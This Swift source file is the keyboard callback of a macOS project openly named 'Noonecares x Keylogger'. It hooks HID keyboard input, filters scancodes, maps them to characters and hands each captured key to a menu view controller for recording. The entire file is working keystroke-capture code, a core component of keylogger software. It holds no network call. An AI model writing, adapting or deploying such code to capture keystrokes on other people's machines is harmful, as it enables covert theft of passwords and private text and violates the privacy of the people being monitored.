//
//  KeyCallback.swift
//  Noonecares x Keylogger
//
//  Created by Skrew Everything on 14/01/17.
//  Modified by Lesterrry on 24/07/21
//  Copyright © 2017 Skrew Everything, © 2021 Lesterrry. All rights reserved.
//

import Foundation
import Cocoa

var lastChar = "" // For some reason, every event I get gets triggered twice. I made this lazy and silly thing to avoid this.

class CallBackFunctions
{     
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        print("B")
        let myself = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device);
        if (IOHIDElementGetUsagePage(elem) != 0x07)
        {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        if (scancode < 4 || scancode > 231 || scancode == 57 || (scancode >= 224 && scancode <= 231))
        {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device);
        if pressed == 1
        {
            if let key = myself.keyMap[scancode]?[0] {
                if key != lastChar {
                    lastChar = key
                    MenuViewController.registerKeyloggerEvent(key)
                } else {
                    lastChar = ""
                }
            }
        }
    }
}
